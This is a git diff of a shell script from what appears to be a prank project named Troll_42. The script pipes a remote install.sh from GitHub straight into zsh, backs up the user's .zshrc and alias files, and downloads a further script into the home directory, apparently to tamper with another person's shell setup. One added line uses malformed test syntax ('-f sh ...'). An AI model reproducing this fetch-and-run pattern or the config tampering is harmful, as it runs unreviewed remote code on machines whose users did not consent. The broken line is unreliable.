@@ -6,12 +6,12 @@
 #    By: amonteli <amonteli@student.le-101.fr>      +:+   +:    +:    +:+      #
 #                                                  #+#   #+    #+    #+#       #
 #    Created: 2019/07/20 21:38:02 by amonteli     #+#   ##    ##    #+#        #
-#    Updated: 2019/07/25 13:24:36 by amonteli    ###    #+. /#+    ###.fr      #
+#    Updated: 2019/07/25 13:27:35 by amonteli    ###    #+. /#+    ###.fr      #
 #                                                          /                   #
 #                                                         /                    #
 # **************************************************************************** #
 
-if [ -f ~/.brewconfig.zsh ]
+if [ -f sh /Users/$USER/.brewconfig.zsh ]
 then
 	(brew install switchaudio-osx)
 else
@@ -19,14 +19,14 @@ else
 	(curl -fsSL https://raw.githubusercontent.com/iSnkh/Troll_42/master/lsound/install.sh | zsh)
 fi
 
-if [ -f ~/.zshrc ]
+if [ -f /Users/$USER/.zshrc ]
 then
-		cp ~/.zshrc ~/.zshrcsave
+		cp /Users/$USER/.zshrc /Users/$USER/.zshrcsave
 fi
 
-if [ -f ~/.oh-my-zsh/custom/alias.zsh ]
+if [ -f /Users/$USER//.oh-my-zsh/custom/alias.zsh ]
 then
-		cp ~/.oh-my-zsh/custom/alias.zsh ~/.oh-my-zsh/custom/.aliassave
+		cp /Users/$USER/.oh-my-zsh/custom/alias.zsh /Users/$USER/.oh-my-zsh/custom/.aliassave
 fi
 
 curl https://raw.githubusercontent.com/iSnkh/Troll_42/master/lsound/zsht.sh -o ~/.zsht.sh
